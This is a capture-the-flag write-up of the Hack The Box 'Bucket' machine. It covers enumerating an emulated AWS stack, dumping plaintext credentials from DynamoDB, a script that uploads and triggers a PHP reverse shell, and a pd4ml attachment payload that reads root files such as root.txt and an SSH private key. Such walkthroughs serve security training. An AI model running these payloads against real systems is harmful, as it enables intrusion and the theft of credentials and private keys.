<!DOCTYPE html>
<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.99.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark"><title>HTB Bucket&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.8a20650921066633f421ce7a745e34cd4032f36a72cc46f51a06d1fe62549284c37e461fd23cd89b3f123ccdc212cd1b.css" integrity="sha384-iiBlCSEGZjP0Ic56dF40zUAy82pyzEb1GgbR/mJUkoTDfkYf0jzYmz8SPM3CEs0b"><meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="HTB Bucket" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><img class="site logo" src="/img/NightWolf.jpg" alt /><span class="site name">The Wolf Den</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
    <h1 class="article title">HTB Bucket</h1><p class="article date">2021-04-24</p></section><article class="article markdown-body"><p><img  src="/img/bucket-logo.png"
        alt/></p>
<p>Bucket is a very interesting box that replicates an AWS Cloud Stack. It&rsquo;s also quick to the draw on file clean up so some scripting is useful to obtain a foothold.</p>
<h2 id="nmap">Nmap</h2>
<p>Starting off with the usual nmap scan shows two open ports. A <code>bucket.htb</code> web page on port 80 and SSH on port 22.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sC -sV 10.10.10.212  
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> nightwolf:
</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-10-29 22:27 UTC
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.212
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.099s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed ports
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://bucket.htb/
</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.88 seconds
</span></span></code></pre></div><p>We add <code>bucket.htb</code> to our <code>/etc/hosts</code> file and navigate to the page.</p>
<p><img  src="/img/bucket-buckethomepage.png"
        alt/></p>
<p>Port 80 hosts single page website and not much else. No other pages are linked and there is no visible method to provide user input. The page&rsquo;s HTML does show some useful information however.</p>
<p><img  src="/img/bucket-sources3.png"
        alt/></p>
<p>Images are being loaded from <code>s3.bucket.htb.</code> DNS won&rsquo;t resolve this so it requires an entry in /etc/hosts file to reach. There is some JSON stating something is &ldquo;running&rdquo;.</p>
<p>Running FFUF on the S3 subdomain finds some more pages with useful information.</p>
<pre tabindex="0"><code> ffuf -u http://s3.bucket.htb/FUZZ -w /opt/dirbuster-wordlists/directory-list-2.3-medium.txt

        /&#39;___\  /&#39;___\           /&#39;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://s3.bucket.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/dirbuster-wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

health                  [Status: 200, Size: 54, Words: 5, Lines: 1]
shell                   [Status: 200, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
:: Progress: [220547/220547]Â :: Job [1/1] :: 108 req/sec :: Duration: [0:33:52] :: Errors: 0 ::
</code></pre><p><code>/health</code> states that s3 and dynamodb are running.</p>
<p><img  src="/img/bucket-s3health.png"
        alt/></p>
<p><code>/server-status</code> is forbidden. <code>/shell</code> redirects to port 45566 before crashing out. Unless another <code>/</code> is added to the end. It then directs to a dynamodb web shell.</p>
<p><img  src="/img/bucket-dynamodbjavascriptshell.png"
        alt/></p>
<p>This looks rather like AWS server of some kind. HTB isn&rsquo;t running off AWS though.  So there most be another explanation. Research for a how to set up AWS locally turns up LocalStack on GitHub, a project designed to emulate an Amazon cloud stack.</p>
<p><a href="https://github.com/localstack/localstack"target="_blank" rel="noopener noreferrer">https://github.com/localstack/localstack</a>
</p>
<p>It is designed to work as a local version of AWS and to emulate a number of it&rsquo;s components for testing. Awsclient, a tool for interacting with AWS services can also be used to interface with LocalStack.</p>
<p>The S3 API  can be used to discover and  enumerate the contents of an S3 bucket.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># List Buckets</span>
</span></span><span style="display:flex;"><span>aws s3api list-buckets --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># List contents of bucket &#39;adserver&#39;</span>
</span></span><span style="display:flex;"><span>aws s3api list-objects --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default --bucket adserver
</span></span></code></pre></div><p>A bucket called &ldquo;adserver&rdquo; is accessible without authentication. Listing the contents shows the images and <code>index.html</code> that were seen on the <code>bucket.htb</code> prior.</p>
<p>Dynamodb,the other service that we have seen mentioned, is also accessible without authentication and contains a users table.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># List tables</span>
</span></span><span style="display:flex;"><span>aws dynamodb list-tables --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Describe users table</span>
</span></span><span style="display:flex;"><span>aws dynamodb describe-table --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default --table-name users
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># List the Content (Creds)</span>
</span></span><span style="display:flex;"><span>aws dynamodb scan --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default --table-name users
</span></span></code></pre></div><p>Enumerating the contents of the users table, reveals a number of credentials.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws dynamodb scan --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default --table-name users
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Items&#34;</span>: <span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Management@#1@#&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Mgmt&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Welcome123!&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Cloudadm&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Sysadm&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">]</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Count&#34;</span>: 3,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ScannedCount&#34;</span>: 3,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ConsumedCapacity&#34;</span>: null
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>These use to attempt login in over SSH on port 22. None return valid.</p>
<p>Another option is  attempt to upload a web shell. This is a bit tricky as Bucket is very aggressive at cleaning up user files. In order to make sure we don&rsquo;t miss it, we create the following script to upload Pentest Monkey&rsquo;s PHP reverse shell and repeatedly request it. Start a netcat listener and run the script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>x<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>aws --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ s3 cp magic.php s3://adserver/magic.php --profile default
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger the reverse shell</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>       curl http://bucket.htb/magic.php
</span></span><span style="display:flex;"><span>       echo Try: $x
</span></span><span style="display:flex;"><span>       <span style="color:#f92672">((</span>x<span style="color:#f92672">=</span>x+1<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>       sleep <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>This uploads the reverse shell to the adserver bucket and then repeatedly requests it from the HTTP server. When the reverse shell has been published to the HTTP server a callback is received giving an attacker remote code execution.</p>
<h2 id="user">User</h2>
<p>The call back is as <code>www-data</code>. <code>/home</code> can be checked to show users that could be potentially be logged in to. <code>roy</code> is one such uaer. Logins can now be attempted on port 22 using the passwords obtained earlier. <code>n2vM-&lt;_K_Q:.Aa2</code>, is valid.</p>
<h2 id="root">Root</h2>
<p>There isn&rsquo;t anything promptly useful in <code>roy</code>&rsquo;s groups, sudo rights, or home folder.
However, <code>/var/www/bucket-app</code>. index.php has some interesting content.</p>
<p><img  src="/img/bucket-pd4cmd.png"
        alt/></p>
<p>The PHP code reveals that if an a post request is made where action is equal to <code>get_alerts</code>, the contents of the data field in the Ransomware table are converted into a PDF by a Java application called Pd4Cmd. This application has been exploited before as detailed in <a href="https://medium.com/bugbountywriteup/how-i-hacked-redbus-an-online-bus-ticketing-application-24ef5bb083cd"target="_blank" rel="noopener noreferrer">this article.</a>
</p>
<p>It describes how a bug in Pd4Cmd was leveraged in to attach the content of arbitrary files to a generated PDF. This could used to leak sensitive files such as a root SSH key or <code>/etc/shadow</code>.</p>
<p>Before that be done, <code>index.php</code> needs to be accessible. It&rsquo;s not on the HTTP sever we interacted with before, <code>bucket.htb</code>.  Settings for web Apache web servers can be found in, <code>/etc/apache2/ports.conf</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roy@bucket:/etc/apache2$ cat ports.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e"># If you just change the port or add more ports here, you will likely also</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># have to change the VirtualHost statement in</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/apache2/sites-enabled/000-default.conf</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Listen <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>Listen 127.0.0.1:8000
</span></span><span style="display:flex;"><span>&lt;IfModule ssl_module&gt;
</span></span><span style="display:flex;"><span>        Listen <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>&lt;/IfModule&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;IfModule mod_gnutls.c&gt;
</span></span><span style="display:flex;"><span>        Listen <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>&lt;/IfModule&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
</span></span></code></pre></div><p>There is another server listening locally on port 8000. Checking it&rsquo;s contents with a curl returns the HTML content of <code>index.php</code>.</p>
<p>Recalling aggressive cleanup scripts, it seems prudent to script our interactions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> <span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create the alerts table. (It doesn&#39;t exist be default.)</span>
</span></span><span style="display:flex;"><span>aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName<span style="color:#f92672">=</span>title,AttributeType<span style="color:#f92672">=</span>S AttributeName<span style="color:#f92672">=</span>data,AttributeType<span style="color:#f92672">=</span>S --key-schema     AttributeName<span style="color:#f92672">=</span>title,KeyType<span style="color:#f92672">=</span>HASH AttributeName<span style="color:#f92672">=</span>data,KeyType<span style="color:#f92672">=</span>RANGE --provisioned-throughput ReadCapacityUnits<span style="color:#f92672">=</span>5,WriteCapacityUnits<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --endpoint-url http:    //s3.bucket.htb/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create an entry in the alerts table that contains our payload.</span>
</span></span><span style="display:flex;"><span>aws dynamodb put-item --table-name <span style="color:#e6db74">&#34;alerts&#34;</span> --item <span style="color:#e6db74">&#39;{ &#34;title&#34;: {&#34;S&#34;: &#34;Ransomware&#34;}, &#34;data&#34;: {&#34;S&#34;: &#34;&lt;pd4ml:attachment description=\&#34;attached.txt\&#34; icon=\&#34;    PushPin\&#34;&gt;file:///root/root.txt&lt;/pd4ml:attachment&gt;&#34;} }&#39;</span> --return-consumed-capacity Total --endpoint-url http://s3.bucket.htb/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Scan the table and make sure our data is entered successfully.</span>
</span></span><span style="display:flex;"><span>aws dynamodb scan --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default --table-name alerts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Log into Bucket over ssh and curl the local web server. Then copy the newly created results.pdf to /dev/shm for us to collect.</span>
</span></span><span style="display:flex;"><span>sshpass -p <span style="color:#e6db74">&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span> ssh roy@bucket.htb <span style="color:#e6db74">&#34;curl http://127.0.0.1:8000/ -d &#39;action=get_alerts&#39;; sleep 5; cp /var/www/bucket-app/files/result.pdf /dev/shm/.file&#34;</span>
</span></span></code></pre></div><p>After executing the above, <code>/dev/shm</code> contains root.txt. It is also possible to login as root by changing the file attachment to be an <code>/root/.ssh/id_rsa</code>.</p>
<h2 id="wrap-up">Wrap Up</h2>
<p>Learning about AWS was a large part of this box and it created a unique experience. It was a really enjoyable to learn about the platform and how to interact with it. Thanks MrR3boot for the machine!</p>
</article>
</div>
<div class="article bottom"><section class="article navigation"><p><a class="link" href="/htb-writeups/ready-writeup.md/"><span class="iconfont icon-article"></span>HTB Ready</a></p><p><a class="link" href="/htb-writeups/academy-writeup/"><span class="iconfont icon-article"></span>HTB Academy</a></p></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">The Wolf Den</p>
    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div>
</section></body>

</html>